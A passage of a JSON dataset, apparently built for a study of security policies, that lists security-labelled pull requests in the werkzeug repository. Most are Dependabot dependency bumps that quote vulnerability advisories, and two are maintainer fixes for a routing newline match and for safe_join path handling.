`@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2080",
                    "merged_at": "2021-04-06T18:03:38Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2070",
                "title": "[Security] Bump jinja2 from 2.11.2 to 2.11.3",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2070,
                "id": 836379451,
                "state": "closed",
                "project_created_at": "2021-03-19T21:43:22Z",
                "closed_at": "2021-03-19T21:45:45Z",
                "body": "Bumps [jinja2](https://github.com/pallets/jinja) from 2.11.2 to 2.11.3. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-g3rq-g295-4j3m\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Regular Expression Denial of Service (ReDoS)</strong>\nThis affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9.<em>-]+.[a-zA-Z0-9.</em>-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory.</p>\n<p>Affected versions: &lt; 2.11.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/pallets/jinja/releases\">jinja2's releases</a>.</em></p>\n<blockquote>\n<h2>2.11.3</h2>\n<p>This contains a fix for a speed issue with the <code>urlize</code> filter. <code>urlize</code> is likely to be called on untrusted user input. For certain inputs some of the regular expressions used to parse the text could take a very long time due to backtracking. As part of the fix, the email matching became slightly stricter. The various speedups apply to <code>urlize</code> in general, not just the specific input cases.</p>\n<ul>\n<li>PyPI: <a href=\"https://pypi.org/project/Jinja2/2.11.3/\">https://pypi.org/project/Jinja2/2.11.3/</a></li>\n<li>Changes: <a href=\"https://jinja.palletsprojects.com/en/2.11.x/changelog/#version-2-11-3\">https://jinja.palletsprojects.com/en/2.11.x/changelog/#version-2-11-3</a></li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pallets/jinja/blob/master/CHANGES.rst\">jinja2's changelog</a>.</em></p>\n<blockquote>\n<h1>Version 2.11.3</h1>\n<p>Released 2021-01-31</p>\n<ul>\n<li>Improve the speed of the <code>urlize</code> filter by reducing regex backtracking. Email matching requires a word character at the start of the domain part, and only word characters in the TLD. 1343</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pallets/jinja/commit/cf215390d4a4d6f0a4de27e2687eed176878f13d\"><code>cf21539</code></a> release version 2.11.3</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/15ef8f09b659f9100610583938005a7a10472d4d\"><code>15ef8f0</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1343\">#1343</a> from pallets/urlize-speedup</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/ef658dc3b6389b091d608e710a810ce8b87995b3\"><code>ef658dc</code></a> speed up urlize matching</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/eeca0fecc3318d43f61bc340ad61db641b861ade\"><code>eeca0fe</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1207\">#1207</a> from mhansen/patch-1</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/2dd769111cbb1a2637f805b3b4c652ec8096d371\"><code>2dd7691</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1209\">#1209</a> from mhansen/patch-3</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/48929401db7228db04dfd8e88115dd5c30dc2d86\"><code>4892940</code></a> do_dictsort: update example ready to copy/paste</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/7db7d336ba12574e6205fdd929386fd529e3fad4\"><code>7db7d33</code></a> api.rst: bugfix in docs, import PackageLoader</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/9ec465baefe32e305bd4e61da49e6c39360c194e\"><code>9ec465b</code></a> fix changelog header</li>\n<li>See full diff in <a href=\"https://github.com/pallets/jinja/compare/2.11.2...2.11.3\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=jinja2&package-manager=pip&previous-version=2.11.2&new-version=2.11.3)](https://dependabot.com/compatibility-score/?dependency-name=jinja2&package-manager=pip&previous-version=2.11.2&new-version=2.11.3)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2070",
                    "merged_at": "2021-03-19T21:45:45Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2069",
                "title": "[Security] Bump urllib3 from 1.26.2 to 1.26.3",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2069,
                "id": 836308137,
                "state": "closed",
                "project_created_at": "2021-03-19T19:50:48Z",
                "closed_at": "2021-03-19T19:52:44Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.2 to 1.26.3. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt; 1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.3</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>\n<p>Fixed bytes and string comparison issue with headers (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2141\">#2141</a>)</p>\n</li>\n<li>\n<p>Changed <code>ProxySchemeUnknown</code> error message to be more actionable if the user supplies a proxy URL without a scheme (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2107\">#2107</a>)</p>\n</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.3 (2021-01-26)</h1>\n<ul>\n<li>Fixed bytes and string comparison issue with headers (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2141\">#2141</a>)</li>\n<li>Changed <code>ProxySchemeUnknown</code> error message to be more actionable if the user supplies a proxy URL without a scheme. (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2107\">#2107</a>)</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/361f1e2a61afdef86cb2feb0fa3f302e06c5fe2c\"><code>361f1e2</code></a> Release 1.26.3</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/3179dfdac1ca8137fe2d5d480a18642311adf0fb\"><code>3179dfd</code></a> Allow using deprecated OpenSSL with CRYPTOGRAPHY_ALLOW_OPENSSL_102</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/d97e5d4cbd96f21b4d16ae914d5797ac44a6dbdd\"><code>d97e5d4</code></a> Use Python 3.5 compatible get-pip</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/cb5e2fc6af52b226e3ce68414b1afa23416a036d\"><code>cb5e2fc</code></a> [1.26] Don't compare bytes and str in putheader()</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/b89158f30f9fa427ec3cbad29368d917f4fdd367\"><code>b89158f</code></a> [1.26] Update RECENT_DATE to 2020-07-01</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a800c745969ef7d06ad3ea0a7722da521f2934cd\"><code>a800c74</code></a> [1.26] Recommend GitHub Sponsors instead of Open Collective</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/947284e6bede3fe4e1098844680a36c0389c2c85\"><code>947284e</code></a> [1.26] Improve message for ProxySchemeUnknown exception</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.2...1.26.3\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.2&new-version=1.26.3)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.2&new-version=1.26.3)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2069",
                    "merged_at": "2021-03-19T19:52:44Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2038",
                "title": "[Security] Bump cryptography from 3.3.1 to 3.3.2",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2038,
                "id": 805073657,
                "state": "closed",
                "project_created_at": "2021-02-10T01:38:06Z",
                "closed_at": "2021-02-10T01:40:47Z",
                "body": "Bumps [cryptography](https://github.com/pyca/cryptography) from 3.3.1 to 3.3.2. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-rhm9-p9w5-fwm7\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Symmetrically encrypting large values can lead to integer overflow</strong></p>\n<h3>Impact</h3>\n<p>When certain sequences of <code>update()</code> calls with large values (multiple GBs) for symetric encryption or decryption occur, it's possible for an integer overflow to happen, leading to mishandling of buffers.</p>\n<h3>Patches</h3>\n<p>This is patched in version 3.3.2 and newer.</p>\n<h3>References</h3>\n<ul>\n<li><a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5615\">pyca/cryptography#5615</a></li>\n</ul>\n<p>Affected versions: &gt;= 3.1, &lt; 3.3.2</p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst\">cryptography's changelog</a>.</em></p>\n<blockquote>\n<h1>3.3.2 - 2021-02-07</h1>\n<ul>\n<li><strong>SECURITY ISSUE:</strong> Fixed a bug where certain sequences of <code>update()</code> calls when symmetrically encrypting very large payloads (&gt;2GB) could result in an integer overflow, leading to buffer overflows. <em>CVE-2020-36242</em></li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/commit/82b6ce28389f0a317bc55ba2091a74b346db7cae\"><code>82b6ce2</code></a> correct buffer overflows cause by integer overflow in openssl (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5747\">#5747</a>)</li>\n<li>See full diff in <a href=\"https://github.com/pyca/cryptography/compare/3.3.1...3.3.2\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=cryptography&package-manager=pip&previous-version=3.3.1&new-version=3.3.2)](https://dependabot.com/compatibility-score/?dependency-name=cryptography&package-manager=pip&previous-version=3.3.1&new-version=3.3.2)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2038",
                    "merged_at": "2021-02-10T01:40:47Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/1950",
                "title": "[Security] Bump cryptography from 3.1.1 to 3.2",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1950,
                "id": 730808911,
                "state": "closed",
                "project_created_at": "2020-10-27T20:48:50Z",
                "closed_at": "2020-10-27T20:54:56Z",
                "body": "Bumps [cryptography](https://github.com/pyca/cryptography) from 3.1.1 to 3.2. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-hggm-jpg3-v476\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>RSA decryption vulnerable to Bleichenbacher timing vulnerability</strong></p>\n<h3>Impact</h3>\n<p>RSA decryption was vulnerable to Bleichenbacher timing vulnerabilities, which would impact people using RSA decryption in online scenarios.</p>\n<h3>Patches</h3>\n<p>This is fixed in cryptography 3.2. <a href=\"https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494\">https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494</a> is the resolving commit.</p>\n<p>Affected versions: &lt; 3.2</p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst\">cryptography's changelog</a>.</em></p>\n<blockquote>\n<h1>3.2 - 2020-10-25</h1>\n<ul>\n<li><strong>SECURITY ISSUE:</strong> Attempted to make RSA PKCS#1v1.5 decryption more constant time, to protect against Bleichenbacher vulnerabilities. Due to limitations imposed by our API, we cannot completely mitigate this vulnerability and a future release will contain a new API which is designed to be resilient to these for contexts where it is required. Credit to <strong>Hubert Kario</strong> for reporting the issue. <em>CVE-2020-25659</em></li>\n<li>Support for OpenSSL 1.0.2 has been removed. Users on older version of OpenSSL will need to upgrade.</li>\n<li>Added basic support for PKCS7 signing (including SMIME) via ~cryptography.hazmat.primitives.serialization.pkcs7.PKCS7SignatureBuilder.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/commit/c9e65222c91df8b6f61650a3460e30232962c1e0\"><code>c9e6522</code></a> 3.2 release (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5508\">#5508</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494\"><code>58494b4</code></a> Attempt to mitigate Bleichenbacher attacks on RSA decryption (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5507\">#5507</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/cf9bd6a36bc7b05abca114b76e216598d9ad9b16\"><code>cf9bd6a</code></a> move blinding to <strong>init</strong> on both RSA public and private (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5506\">#5506</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/bf4b962f4b92a1633835b2d17974f18de2d61620\"><code>bf4b962</code></a> be more verbose in the 102 deprecation notice (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5505\">#5505</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/ada53e7ca0f04a33711c330a130d34376e5ecc2b\"><code>ada53e7</code></a> make the regexes for branches more strict (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5504\">#5504</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/8be1d4b1113eabea306dd60ab64e7f00815d6a52\"><code>8be1d4b</code></a> Stop using <a href=\"https://github.com/master\">@master</a> for GH actions (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5503\">#5503</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/08a97cca715ca0842d6792d0079e351efbb48ec9\"><code>08a97cc</code></a> Bump actions/upload-artifact from v1 to v2.2.0 (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5502\">#5502</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/52a0e44e97dd6e150509b14c9b1f76a261f12786\"><code>52a0e44</code></a> Add a dependabot configuration to bump our github actions (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5501\">#5501</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/611c4a340f6c53a7e28a9695a3248bd4e9f8558d\"><code>611c4a3</code></a> PKCS7SignatureBuilder now supports new option NoCerts when signing (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5500\">#5500</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/836a92a28fbe9df8c37121e340b91ed9cd519ddd\"><code>836a92a</code></a> chunking didn't actually work (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5499\">#5499</a>)</li>\n<li>Additional commits viewable in <a href=\"https://github.com/pyca/cryptography/compare/3.1.1...3.2\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=cryptography&package-manager=pip&previous-version=3.1.1&new-version=3.2)](https://dependabot.com/compatibility-score/?dependency-name=cryptography&package-manager=pip&previous-version=3.1.1&new-version=3.2)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/1950",
                    "merged_at": "2020-10-27T20:54:56Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email_advisory",
        "num_security_issues_after_policy": 7,
        "num_security_issue_and_pull": 7,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/pallets/werkzeug/pull/2350",
                "title": "routing match includes newline",
                "labels": [
                    "security"
                ],
                "user": "davidism",
                "issue_author_association": "MEMBER",
                "number": 2350,
                "id": 1171123067,
                "state": "closed",
                "project_created_at": "2022-03-16T14:44:44Z",
                "closed_at": "2022-03-16T14:46:26Z",
                "body": "The `$` in regular expressions will match *before and after* a newline character. WSGI requires the server to decode `PATH_INFO`, which can result in a requested URL `/hello%0a` looking like `/hello\\n` to the application. If you have some middleware that intercepts `/hello`, depending on how it does that, this could result in the application handling the URL instead.\r\n\r\nUse `\\Z` instead of `$` to match only the true end of the string.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2350",
                    "merged_at": "2022-03-16T14:46:26Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2349",
                "title": "`safe_join` keeps `directory=\"\"` as relative path",
                "labels": [
                    "security"
                ],
                "user": "davidism",
                "issue_author_association": "MEMBER",
                "number": 2349,
                "id": 1170302532,
                "state": "closed",
                "project_created_at": "2022-03-15T21:51:04Z",
                "closed_at": "2022-03-15T22:01:34Z",
                "body": "When using `send_from_directory`, which uses `safe_join`, if `directory=\"\"` is given, it was discarded and the first untrusted path component could become the first component if it was a Windows drive-relative path.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2349",
                    "merged_at": "2022-03-15T22:01:34Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2080",
                "title": "[Security] Bump urllib3 from 1.26.3 to 1.26.4",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2080,
                "id": 851676192,
                "state": "closed",
                "project_created_at": "2021-04-06T18:01:45Z",
                "closed_at": "2021-04-06T18:03:38Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.3 to 1.26.4. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt;= 